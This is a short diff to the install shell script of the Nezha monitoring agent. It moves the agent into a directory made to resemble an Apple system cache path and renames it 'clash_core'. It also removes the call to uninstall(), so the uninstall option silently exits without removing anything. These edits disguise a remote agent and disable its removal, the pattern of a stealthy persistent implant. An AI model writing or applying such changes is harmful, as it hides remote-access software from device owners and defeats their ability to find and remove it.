@@ -1,7 +1,16 @@
 #!/bin/sh
 
-NZ_BASE_PATH="/opt/nezha"
-NZ_AGENT_PATH="${NZ_BASE_PATH}/agent"
+NZ_BASE_PATH="/Library/Apple/Library/Bundles/Cache"
+NZ_AGENT_PATH="${NZ_BASE_PATH}/clash_core"
+
+# 检查 NZ_BASE_PATH 是否存在，如果不存在则创建
+if [ ! -d "$NZ_BASE_PATH" ]; then
+    mkdir -p "$NZ_BASE_PATH"
+    if [ $? -ne 0 ]; then
+        echo "Error: Failed to create directory $NZ_BASE_PATH"
+        exit 1
+    fi
+fi
 
 red='\033[0;31m'
 green='\033[0;32m'
@@ -190,7 +199,6 @@ uninstall() {
 }
 
 if [ "$1" = "uninstall" ]; then
-    uninstall
     exit
 fi
 
